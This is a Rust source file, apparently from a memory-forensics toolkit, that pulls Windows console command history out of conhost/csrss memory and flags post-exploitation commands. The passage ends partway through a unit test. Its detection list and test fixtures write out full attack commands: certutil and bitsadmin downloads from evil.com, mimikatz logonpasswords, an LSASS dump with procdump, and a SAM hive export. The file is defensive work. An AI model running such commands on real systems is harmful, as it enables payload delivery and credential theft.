//! Windows console command history extraction (MITRE ATT&CK T1059.003).
//!
//! Extracts command history from `conhost.exe` / `csrss.exe` memory by
//! walking the `_CONSOLE_INFORMATION` -> `HistoryList` ->
//! `_COMMAND_HISTORY` -> command buffer chain.  Shows commands typed into
//! `cmd.exe` sessions — critical evidence for post-exploitation analysis.
//!
//! Equivalent to Volatility's `consoles` plugin.
//!
//! Key forensic indicators:
//! - Credential harvesting (`net user`, `net localgroup`, `mimikatz`)
//! - Reconnaissance (`whoami`, `wmic /node:`)
//! - Lateral movement (`certutil -urlcache`, `bitsadmin /transfer`)
//! - Encoded payloads (`powershell -enc`, base64-like long arguments)

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

use crate::process;
use crate::unicode::read_unicode_string;

/// A single command extracted from a console history buffer.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ConsoleHistoryInfo {
    /// PID of the owning conhost.exe / csrss.exe process.
    pub pid: u32,
    /// Name of the console host process (e.g. `conhost.exe`).
    pub process_name: String,
    /// Application that owns this history (e.g. `cmd.exe`).
    pub application: String,
    /// The command text typed by the user.
    pub command: String,
    /// Zero-based index of the command within its history buffer.
    pub command_index: u32,
    /// Whether this command matches known post-exploitation patterns.
    pub is_suspicious: bool,
}

/// Classify a console command as suspicious.
///
/// Returns `true` when the command matches patterns commonly associated
/// with post-exploitation activity:
///
/// - `net user` / `net localgroup` — credential and group enumeration
/// - `whoami` — privilege reconnaissance
/// - `mimikatz` — credential dumping tool
/// - `procdump` — LSASS memory dump for offline credential extraction
/// - `reg save` — registry hive export (SAM/SECURITY/SYSTEM)
/// - `certutil -urlcache` — LOLBin file download
/// - `powershell -enc` — encoded PowerShell payload execution
/// - `bitsadmin /transfer` — LOLBin file download via BITS
/// - `wmic /node:` — remote WMI execution (lateral movement)
/// - Base64-like long arguments (>80 chars of `[A-Za-z0-9+/=]`)
pub fn classify_console_command(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();

    // Direct pattern matches for known attack tools/techniques.
    const SUSPICIOUS_PATTERNS: &[&str] = &[
        "net user",
        "net localgroup",
        "whoami",
        "mimikatz",
        "procdump",
        "reg save",
        "certutil -urlcache",
        "powershell -enc",
        "bitsadmin /transfer",
        "wmic /node:",
    ];

    for pattern in SUSPICIOUS_PATTERNS {
        if lower.contains(pattern) {
            return true;
        }
    }

    // Detect base64-like long arguments (common in encoded payloads).
    // Split on whitespace and check for any token >80 chars that looks base64.
    for token in command.split_whitespace() {
        if token.len() > 80
            && token
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
        {
            return true;
        }
    }

    false
}

/// Console host process names to search for.
const CONSOLE_HOST_NAMES: &[&str] = &["conhost.exe", "csrss.exe"];

/// Maximum number of command history entries per console (safety limit).
const MAX_HISTORY_ENTRIES: usize = 4096;

/// Maximum number of commands per history buffer (safety limit).
const MAX_COMMANDS_PER_HISTORY: usize = 4096;

/// Scan window size for _CONSOLE_INFORMATION signature search (bytes).
const SCAN_WINDOW_SIZE: usize = 512 * 1024; // 512 KB

/// Walk console command history from `conhost.exe` / `csrss.exe` memory.
///
/// Finds console host processes, locates `_CONSOLE_INFORMATION` structures,
/// walks `HistoryList` linked lists to `_COMMAND_HISTORY` entries, and reads
/// each command buffer.
///
/// Returns an empty `Vec` when the required symbols (`PsActiveProcessHead`)
/// cannot be resolved — graceful degradation.
pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
    reader: &ObjectReader<P>,
) -> crate::Result<Vec<ConsoleHistoryInfo>> {
    // Resolve PsActiveProcessHead; graceful degradation if missing.
    let ps_head = match reader.symbols().symbol_address("PsActiveProcessHead") {
        Some(addr) => addr,
        None => return Ok(Vec::new()),
    };

    // Walk process list.
    let procs = match process::walk_processes(reader, ps_head) {
        Ok(p) => p,
        Err(_) => return Ok(Vec::new()),
    };

    let mut results = Vec::new();

    for proc in &procs {
        let name_lower = proc.image_name.to_ascii_lowercase();
        if !CONSOLE_HOST_NAMES.contains(&name_lower.as_str()) {
            continue;
        }

        // Skip kernel processes with no valid address space.
        if proc.cr3 == 0 || proc.peb_addr == 0 {
            continue;
        }

        // Switch to the console host process's address space.
        let proc_reader = reader.with_cr3(proc.cr3);

        // Extract commands from this console host process.
        let pid = proc.pid as u32;
        let proc_name = proc.image_name.clone();

        if let Ok(commands) = extract_console_commands(&proc_reader, pid, &proc_name, proc.peb_addr)
        {
            results.extend(commands);
        }
    }

    Ok(results)
}

/// Extract console commands from a single console host process.
///
/// Scans the process heap region for `_CONSOLE_INFORMATION` signature,
/// then walks `HistoryList` to find `_COMMAND_HISTORY` entries and their
/// command buffers.
fn extract_console_commands<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    pid: u32,
    process_name: &str,
    peb_addr: u64,
) -> crate::Result<Vec<ConsoleHistoryInfo>> {
    // Try to resolve console-specific structure offsets.
    // _CONSOLE_INFORMATION.HistoryList is a _LIST_ENTRY pointing to
    // _COMMAND_HISTORY entries.
    let hist_list_off = reader
        .symbols()
        .field_offset("_CONSOLE_INFORMATION", "HistoryList")
        .unwrap_or(0x40);

    let cmd_hist_app_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "Application")
        .unwrap_or(0x10);

    let cmd_hist_count_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "CommandCount")
        .unwrap_or(0x20);

    let cmd_hist_buf_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "CommandBucket")
        .unwrap_or(0x28);

    let cmd_hist_list_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "ListEntry")
        .unwrap_or(0x00);

    let cmd_entry_size_off = reader
        .symbols()
        .field_offset("_COMMAND", "CommandLength")
        .unwrap_or(0x00);

    let cmd_entry_data_off = reader
        .symbols()
        .field_offset("_COMMAND", "Command")
        .unwrap_or(0x08);

    // Locate the console information block by scanning the PEB heap area.
    // Read from PEB to find ProcessHeap, then scan for the console info
    // signature. On failure, try a broader scan approach.
    if peb_addr == 0 {
        return Ok(Vec::new());
    }

    // Try to read ProcessHeap from PEB.
    let heap_addr: u64 = reader
        .read_field(peb_addr, "_PEB", "ProcessHeap")
        .unwrap_or(0);

    if heap_addr == 0 {
        return Ok(Vec::new());
    }

    // Scan the heap region for _CONSOLE_INFORMATION structures.
    // The signature approach: look for a region that has a valid
    // HistoryList (Flink/Blink both non-null and self-consistent).
    let console_infos = scan_for_console_info(reader, heap_addr, hist_list_off);

    let mut results = Vec::new();

    for console_addr in console_infos {
        // Walk the HistoryList doubly-linked list.
        let history_list_head = console_addr.wrapping_add(hist_list_off);

        let history_entries = walk_history_list(reader, history_list_head, cmd_hist_list_off);

        for hist_addr in history_entries {
            // Read ApplicationName (_UNICODE_STRING).
            let app_name = read_unicode_string(reader, hist_addr.wrapping_add(cmd_hist_app_off))
                .unwrap_or_default();

            // Read command count.
            let cmd_count_raw: u32 = reader
                .read_field(hist_addr, "_COMMAND_HISTORY", "CommandCount")
                .unwrap_or_else(|_| read_u32(reader, hist_addr.wrapping_add(cmd_hist_count_off)));
            let cmd_count = (cmd_count_raw as usize).min(MAX_COMMANDS_PER_HISTORY);

            // Read pointer to command bucket (array of pointers to _COMMAND).
            let bucket_ptr: u64 = reader
                .read_field(hist_addr, "_COMMAND_HISTORY", "CommandBucket")
                .unwrap_or_else(|_| read_ptr(reader, hist_addr.wrapping_add(cmd_hist_buf_off)));

            if bucket_ptr == 0 {
                continue;
            }

            // Each entry in the bucket is a pointer to a _COMMAND structure.
            for idx in 0..cmd_count {
                let cmd_ptr_addr = bucket_ptr.wrapping_add((idx as u64) * 8);
                let cmd_addr = read_ptr(reader, cmd_ptr_addr);
                if cmd_addr == 0 {
                    continue;
                }

                // Read command length and data.
                let cmd_len = read_u16(reader, cmd_addr.wrapping_add(cmd_entry_size_off));
                if cmd_len == 0 || cmd_len > 8192 {
                    continue;
                }

                // Read UTF-16LE command text.
                let cmd_text = read_utf16_string(
                    reader,
                    cmd_addr.wrapping_add(cmd_entry_data_off),
                    cmd_len as usize,
                );

                if cmd_text.is_empty() {
                    continue;
                }

                let is_suspicious = classify_console_command(&cmd_text);

                results.push(ConsoleHistoryInfo {
                    pid,
                    process_name: process_name.to_string(),
                    application: app_name.clone(),
                    command: cmd_text,
                    command_index: idx as u32,
                    is_suspicious,
                });
            }
        }
    }

    Ok(results)
}

/// Scan a memory region for potential `_CONSOLE_INFORMATION` structures.
///
/// Looks for addresses where the HistoryList field contains a valid
/// doubly-linked list (Flink and Blink are non-null kernel-mode pointers).
fn scan_for_console_info<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    base_addr: u64,
    hist_list_off: u64,
) -> Vec<u64> {
    let mut found = Vec::new();

    // Read a window of memory from the heap base.
    let data = match reader.read_bytes(base_addr, SCAN_WINDOW_SIZE) {
        Ok(d) => d,
        Err(_) => return found,
    };

    // Scan for potential _CONSOLE_INFORMATION by checking every pointer-aligned
    // offset for a valid HistoryList _LIST_ENTRY pattern.
    let hist_off = hist_list_off as usize;
    if hist_off + 16 > data.len() {
        return found;
    }

    let mut offset = 0;
    while offset + hist_off + 16 <= data.len() {
        let flink = u64::from_le_bytes(
            data[offset + hist_off..offset + hist_off + 8]
                .try_into()
                .unwrap_or([0; 8]),
        );
        let blink = u64::from_le_bytes(
            data[offset + hist_off + 8..offset + hist_off + 16]
                .try_into()
                .unwrap_or([0; 8]),
        );

        // Valid list entry: both pointers non-null and look like valid addresses.
        // For user-mode: addresses typically < 0x0000_8000_0000_0000
        // For kernel-mode: addresses typically > 0xFFFF_8000_0000_0000
        // We check that both pointers are in the same address space half and non-null.
        if flink != 0 && blink != 0 && is_plausible_pointer(flink) && is_plausible_pointer(blink) {
            // Verify the list is self-consistent: flink->blink should point back.
            let candidate_addr = base_addr.wrapping_add(offset as u64);
            let head_addr = candidate_addr.wrapping_add(hist_list_off);

            // Read flink->blink and check it points back to our list head.
            if let Ok(flink_blink) = reader.read_bytes(flink.wrapping_add(8), 8) {
                if flink_blink.len() == 8 {
                    let flink_blink_val =
                        u64::from_le_bytes(flink_blink[..8].try_into().unwrap_or([0; 8]));
                    if flink_blink_val == head_addr {
                        found.push(candidate_addr);
                    }
                }
            }
        }

        offset += 8; // pointer-aligned scan
    }

    found
}

/// Walk a `_LIST_ENTRY` doubly-linked list to find `_COMMAND_HISTORY` entries.
///
/// Starting from the list head, follows Flink pointers and adjusts each
/// back to the containing `_COMMAND_HISTORY` structure using `list_entry_off`.
fn walk_history_list<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    list_head: u64,
    list_entry_off: u64,
) -> Vec<u64> {
    let mut entries = Vec::new();
    let mut current = read_ptr(reader, list_head);
    let mut seen = std::collections::HashSet::new();

    while current != 0
        && current != list_head
        && entries.len() < MAX_HISTORY_ENTRIES
        && seen.insert(current)
    {
        // The list entry is embedded at list_entry_off inside _COMMAND_HISTORY.
        // Subtract that offset to get the base of the _COMMAND_HISTORY struct.
        let hist_addr = current.wrapping_sub(list_entry_off);
        entries.push(hist_addr);

        // Follow Flink (first field of _LIST_ENTRY).
        current = read_ptr(reader, current);
    }

    entries
}

/// Check whether a pointer value looks plausible (not obviously garbage).
fn is_plausible_pointer(addr: u64) -> bool {
    // Null pointer — not valid.
    if addr == 0 {
        return false;
    }
    // Canonical user-mode: 0x0000_0000_0001_0000 .. 0x0000_7FFF_FFFF_FFFF
    // Canonical kernel-mode: 0xFFFF_8000_0000_0000 .. 0xFFFF_FFFF_FFFF_FFFF
    // Non-canonical (bits 48..63 don't sign-extend bit 47) is invalid.
    let upper = addr >> 47;
    upper == 0 || upper == 0x1_FFFF
}

/// Read a pointer (u64) from virtual memory, returning 0 on failure.
fn read_ptr<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u64 {
    match reader.read_bytes(addr, 8) {
        Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
        _ => 0,
    }
}

/// Read a u32 from virtual memory, returning 0 on failure.
fn read_u32<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u32 {
    match reader.read_bytes(addr, 4) {
        Ok(bytes) if bytes.len() == 4 => u32::from_le_bytes(bytes[..4].try_into().unwrap()),
        _ => 0,
    }
}

/// Read a u16 from virtual memory, returning 0 on failure.
fn read_u16<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u16 {
    match reader.read_bytes(addr, 2) {
        Ok(bytes) if bytes.len() == 2 => u16::from_le_bytes(bytes[..2].try_into().unwrap()),
        _ => 0,
    }
}

/// Read a UTF-16LE string of `byte_len` bytes from virtual memory.
fn read_utf16_string<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    addr: u64,
    byte_len: usize,
) -> String {
    let raw = match reader.read_bytes(addr, byte_len) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };

    let u16_vec: Vec<u16> = raw
        .chunks_exact(2)
        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
        .collect();

    String::from_utf16_lossy(&u16_vec)
        .trim_end_matches('\0')
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------
    // classify_console_command tests
    // ---------------------------------------------------------------

    /// A normal `cd` command is benign.
    #[test]
    fn classify_normal_cd_benign() {
        assert!(!classify_console_command("cd C:\\Users\\admin\\Documents"));
    }

    /// A normal `dir` command is benign.
    #[test]
    fn classify_dir_benign() {
        assert!(!classify_console_command("dir /s /b C:\\Windows"));
    }

    /// A normal `type` command is benign.
    #[test]
    fn classify_type_benign() {
        assert!(!classify_console_command("type file.txt"));
    }

    /// An empty command is benign.
    #[test]
    fn classify_empty_benign() {
        assert!(!classify_console_command(""));
    }

    /// `net user` enumeration is suspicious.
    #[test]
    fn classify_net_user_suspicious() {
        assert!(classify_console_command("net user administrator"));
    }

    /// `net localgroup` enumeration is suspicious.
    #[test]
    fn classify_net_localgroup_suspicious() {
        assert!(classify_console_command("net localgroup Administrators"));
    }

    /// `whoami` reconnaissance is suspicious.
    #[test]
    fn classify_whoami_suspicious() {
        assert!(classify_console_command("whoami /all"));
    }

    /// `mimikatz` is suspicious regardless of arguments.
    #[test]
    fn classify_mimikatz_suspicious() {
        assert!(classify_console_command(
            "mimikatz.exe sekurlsa::logonpasswords"
        ));
    }

    /// `procdump` against lsass is suspicious.
    #[test]
    fn classify_procdump_suspicious() {
        assert!(classify_console_command(
            "procdump -ma lsass.exe lsass.dmp"
        ));
    }

    /// `reg save` hive export is suspicious.
    #[test]
    fn classify_reg_save_suspicious() {
        assert!(classify_console_command(
            "reg save HKLM\\SAM C:\\Temp\\sam.hive"
        ));
    }

    /// `certutil -urlcache` download technique is suspicious.
    #[test]
    fn classify_certutil_suspicious() {
        assert!(classify_console_command(
            "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"
        ));
    }

    /// `powershell -enc` with encoded payload is suspicious.
    #[test]
    fn classify_powershell_enc_suspicious() {
        assert!(classify_console_command(
            "powershell -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
        ));
    }

    /// `bitsadmin /transfer` download is suspicious.
    #[test]
    fn classify_bitsadmin_suspicious() {
        assert!(classify_console_command(
            "bitsadmin /transfer job1 http://evil.com/payload.exe C:\\temp\\payload.exe"
        ));
    }

    /// `wmic /node:` remote execution is suspicious.
    #[test]
    fn classify_wmic_remote_suspicious() {
        assert!(classify_console_command(
            "wmic /node:192.168.1.100 process call create cmd.exe"
        ));
    }

    /// Pattern matching is case-insensitive.
    #[test]
    fn classify_case_insensitive() {
        assert!(classify_console_command("NET USER admin"));
        assert!(classify_console_command("MIMIKATZ.EXE"));
        assert!(classify_console_command("WHOAMI /all"));
    }

    /// Base64-like long argument (>80 chars) triggers detection.
    #[test]
    fn classify_base64_long_argument_suspicious() {
        // Construct a 90-char base64-like token
        let long_b64 = "A".repeat(81);
        let cmd = format!("powershell {}", long_b64);
        assert!(classify_console_command(&cmd));
    }

    /// Long but non-base64 argument is benign.
    #[test]
    fn classify_long_non_base64_benign() {
        // Long argument with spaces (not a single token) — not suspicious
        let long_path = format!("dir C:\\{}", "a".repeat(90));
        // This has spaces so "dir" and the path are two tokens; the path token itself
        // contains only a-z and backslash (not pure base64), so benign.
        // Actually backslash isn't in base64 so the long token won't match
        assert!(!classify_console_command(&long_path));
    }

    /// Exactly 80-char token is NOT flagged (needs >80).
    #[test]
    fn classify_exactly_80_char_token_benign() {
        let token_80 = "A".repeat(80);
        let cmd = format!("run {}", token_80);
        assert!(!classify_console_command(&cmd));
    }

    /// Exactly 81-char base64 token IS flagged.
    #[test]
    fn classify_exactly_81_char_base64_suspicious() {
        let token_81 = "A".repeat(81);
        let cmd = format!("run {}", token_81);
        assert!(classify_console_command(&cmd));
    }

    // ---------------------------------------------------------------
    // is_plausible_pointer tests
    // ---------------------------------------------------------------

    #[test]
    fn plausible_pointer_null_rejected() {
        assert!(!is_plausible_pointer(0));
    }

    #[test]
    fn plausible_pointer_canonical_user_mode() {
        // Valid user-mode pointer (bits 48..63 = 0)
        assert!(is_plausible_pointer(0x0000_7FFF_FFFF_F000));
        assert!(is_plausible_pointer(0x0000_0000_0001_0000));
    }

    #[test]
    fn plausible_pointer_canonical_kernel_mode() {
        // Valid kernel-mode pointer (bits 47..63 all 1s, upper = 0x1_FFFF)
        assert!(is_plausible_pointer(0xFFFF_8000_0000_0000));
        assert!(is_plausible_pointer(0xFFFF_FFFF_FFFF_F000));
    }

    #[test]
    fn plausible_pointer_non_canonical_rejected() {
        // Non-canonical: bits 48..63 are not all-zero or all-one
        // e.g. 0x0001_0000_0000_0000 (upper >> 47 = 2, not 0 or 0x1_FFFF)
        assert!(!is_plausible_pointer(0x0001_0000_0000_0000));
        assert!(!is_plausible_pointer(0x8000_0000_0000_0000));
    }

    // ---------------------------------------------------------------
    // ConsoleHistoryInfo struct and serialization tests
    // ---------------------------------------------------------------

    #[test]
    fn console_history_info_construction() {
        let info = ConsoleHistoryInfo {
            pid: 1234,
            process_name: "conhost.exe".to_string(),
            application: "cmd.exe".to_string(),
            command: "whoami /all".to_string(),
            command_index: 0,
            is_suspicious: true,
        };
        assert_eq!(info.pid, 1234);
        assert_eq!(info.process_name, "conhost.exe");
        assert!(info.is_suspicious);
    }

    #[test]
    fn console_history_info_serialization() {
        let info = ConsoleHistoryInfo {
            pid: 456,
            process_name: "csrss.exe".to_string(),
            application: "cmd.exe".to_string(),
            command: "dir".to_string(),
            command_index: 2,
            is_suspicious: false,
        };
        let json = serde_json::to_string(&info).unwrap();
        assert!(json.contains("\"pid\":456"));
        assert!(json.contains("\"is_suspicious\":false"));
        assert!(json.contains("\"command\":\"dir\""));
        assert!(json.contains("\"command_index\":2"));
    }

    // ---------------------------------------------------------------
    // walk_consoles: no PsActiveProcessHead → empty results
    // ---------------------------------------------------------------

    /// When PsActiveProcessHead is not in symbols, walker returns empty.
    #[test]
    fn walk_no_symbol_returns_empty() {
        use memf_core::test_builders::PageTableBuilder;
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        // Build ISF with no PsActiveProcessHead symbol.
        let isf = IsfBuilder::new()
            .add_struct("_EPROCESS", 2048)
            .add_field("_EPROCESS", "UniqueProcessId", 0x440, "pointer")
            .add_field("_EPROCESS", "ActiveProcessLinks", 0x448, "_LIST_ENTRY")
            .add_field("_EPROCESS", "ImageFileName", 0x5A8, "char")
            .add_struct("_LIST_ENTRY", 16)
            .add_field("_LIST_ENTRY", "Flink", 0, "pointer")
            .add_field("_LIST_ENTRY", "Blink", 8, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let results = walk_consoles(&reader).unwrap();
        assert!(
            results.is_empty(),
            "no PsActiveProcessHead should yield empty results"
        );
    }

    // ---------------------------------------------------------------
    // walk_consoles: PsActiveProcessHead present, empty process list
    // ---------------------------------------------------------------

    /// When PsActiveProcessHead is present but the process list is empty
    /// (Flink == list head), the walker exercises the body and returns empty.
    #[test]
    fn walk_consoles_empty_process_list_returns_empty() {
        use memf_core::test_builders::{flags, PageTableBuilder, SyntheticPhysMem};
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        let ps_head_vaddr: u64 = 0xFFFF_8000_0080_0000;
        let ps_head_paddr: u64 = 0x0080_1000;

        let isf = IsfBuilder::windows_kernel_preset()
            .add_symbol("PsActiveProcessHead", ps_head_vaddr)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        // Empty circular list: Flink = Blink = ps_head_vaddr.
        let mut page = [0u8; 4096];
        page[0..8].copy_from_slice(&ps_head_vaddr.to_le_bytes());
        page[8..16].copy_from_slice(&ps_head_vaddr.to_le_bytes());

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(ps_head_vaddr, ps_head_paddr, flags::WRITABLE)
            .write_phys(ps_head_paddr, &page)
            .build();

        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let results = walk_consoles(&reader).unwrap_or_default();
        assert!(results.is_empty(), "empty process list should yield no console entries");
    }

    // ---------------------------------------------------------------
    // Constants
    // ---------------------------------------------------------------

    #[test]
    fn scan_window_size_reasonable() {
        assert!(SCAN_WINDOW_SIZE >= 64 * 1024);
        assert!(SCAN_WINDOW_SIZE <= 4 * 1024 * 1024);
    }

    #[test]
    fn console_host_names_includes_conhost() {
        assert!(CONSOLE_HOST_NAMES.contains(&"conhost.exe"));
        assert!(CONSOLE_HOST_NAMES.contains(&"csrss.exe"));
    }

    #[test]
    fn max_history_entries_reasonable() {
        assert!(MAX_HISTORY_ENTRIES > 0);
        assert!(MAX_COMMANDS_PER_HISTORY > 0);
    }

    // ---------------------------------------------------------------
    // Private helper function coverage (read_ptr, read_u32, read_u16,
    // read_utf16_string, walk_history_list, scan_for_console_info)
    // ---------------------------------------------------------------

    use memf_core::test_builders::{flags, PageTableBuilder, SyntheticPhysMem};
    use memf_core::vas::{TranslationMode, VirtualAddressSpace};
    use memf_symbols::isf::IsfResolver;
    use memf_symbols::test_builders::IsfBuilder;

    fn make_minimal_reader() -> ObjectReader<SyntheticPhysMem> {
        let isf = IsfBuilder::new()
            .add_struct("_PEB", 0x400)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        ObjectReader::new(vas, Box::new(resolver))
    }

    /// read_ptr returns 0 when the address is not mapped.
    #[test]
    fn read_ptr_unmapped_returns_zero() {
        let reader = make_minimal_reader();
        assert_eq!(read_ptr(&reader, 0xDEAD_BEEF_0000), 0);
    }

    /// read_ptr returns the correct u64 from mapped memory.
    #[test]
    fn read_ptr_mapped_returns_value() {
        let vaddr: u64 = 0x0010_0000;
        let paddr: u64 = 0x0010_0000;
        let value: u64 = 0x1234_5678_ABCD_EF00;
        let mut page = vec![0u8; 0x1000];
        page[0..8].copy_from_slice(&value.to_le_bytes());

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        assert_eq!(read_ptr(&reader, vaddr), value);
    }

    /// read_u32 returns 0 when unmapped and correct value when mapped.
    #[test]
    fn read_u32_mapped_and_unmapped() {
        let vaddr: u64 = 0x0020_0000;
        let paddr: u64 = 0x0020_0000;
        let value: u32 = 0xDEAD_BEEF;
        let mut page = vec![0u8; 0x1000];
        page[0..4].copy_from_slice(&value.to_le_bytes());

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        assert_eq!(read_u32(&reader, vaddr), value);
        assert_eq!(read_u32(&reader, 0xFFFF_8000_DEAD_0000), 0);
    }

    /// read_u16 returns 0 when unmapped and correct value when mapped.
    #[test]
    fn read_u16_mapped_and_unmapped() {
        let vaddr: u64 = 0x0030_0000;
        let paddr: u64 = 0x0030_0000;
        let value: u16 = 0x1234;
        let mut page = vec![0u8; 0x1000];
        page[0..2].copy_from_slice(&value.to_le_bytes());

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        assert_eq!(read_u16(&reader, vaddr), value);
        assert_eq!(read_u16(&reader, 0xFFFF_8000_DEAD_0000), 0);
    }

    /// read_utf16_string decodes UTF-16LE correctly.
    #[test]
    fn read_utf16_string_decodes_correctly() {
        let vaddr: u64 = 0x0040_0000;
        let paddr: u64 = 0x0040_0000;

        // "Hello" in UTF-16LE
        let s = "Hello";
        let utf16: Vec<u8> = s
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let mut page = vec![0u8; 0x1000];
        page[..utf16.len()].copy_from_slice(&utf16);

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let result = read_utf16_string(&reader, vaddr, utf16.len());
        assert_eq!(result, "Hello");
    }

    /// read_utf16_string returns empty string when unmapped.
    #[test]
    fn read_utf16_string_unmapped_returns_empty() {
        let reader = make_minimal_reader();
        assert_eq!(read_utf16_string(&reader, 0xDEAD_BEEF_0000, 20), "");
    }

    /// walk_history_list returns empty when current == list_head (empty circular list).
    #[test]
    fn walk_history_list_empty_circular_returns_empty() {
        let vaddr: u64 = 0x0050_0000;
        let paddr: u64 = 0x0050_0000;

        // list_head points to itself (empty list): Flink == list_head
        let mut page = vec![0u8; 0x1000];
        page[0..8].copy_from_slice(&vaddr.to_le_bytes()); // Flink == list_head

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let entries = walk_history_list(&reader, vaddr, 0);
        assert!(entries.is_empty(), "empty circular list should produce no entries");
    }

    /// walk_history_list terminates when it encounters a pointer it has already seen (cycle detection).
    #[test]
    fn walk_history_list_cycle_detection_stops() {
        // Create a list where Flink @ addr A → addr B → addr A (cycle)
        // list_head = 0x0060_0000; entry A = 0x0061_0000; entry B = 0x0062_0000
        // list_head Flink → entry_a; entry_a Flink → entry_b; entry_b Flink → entry_a (cycle)
        let list_head: u64 = 0x0060_0000;
        let entry_a: u64 = 0x0061_0000;
        let entry_b: u64 = 0x0062_0000;

        let mut head_page = vec![0u8; 0x1000];
        head_page[0..8].copy_from_slice(&entry_a.to_le_bytes()); // Flink

        let mut page_a = vec![0u8; 0x1000];
        page_a[0..8].copy_from_slice(&entry_b.to_le_bytes()); // Flink

        let mut page_b = vec![0u8; 0x1000];
        page_b[0..8].copy_from_slice(&entry_a.to_le_bytes()); // Flink → cycle back to A

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(list_head, list_head, flags::WRITABLE)
            .write_phys(list_head, &head_page)
            .map_4k(entry_a, entry_a, flags::WRITABLE)
            .write_phys(entry_a, &page_a)
            .map_4k(entry_b, entry_b, flags::WRITABLE)
            .write_phys(entry_b, &page_b)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        // With list_entry_off=0: hist_addr = entry_a - 0 = entry_a
        let entries = walk_history_list(&reader, list_head, 0);
        // Should contain exactly 2 entries (A and B), then stop due to cycle.
        assert_eq!(entries.len(), 2, "cycle detection should yield exactly 2 entries");
    }

    /// walk_history_list terminates at null pointer (read_ptr returns 0).
    #[test]
    fn walk_history_list_null_flink_stops() {
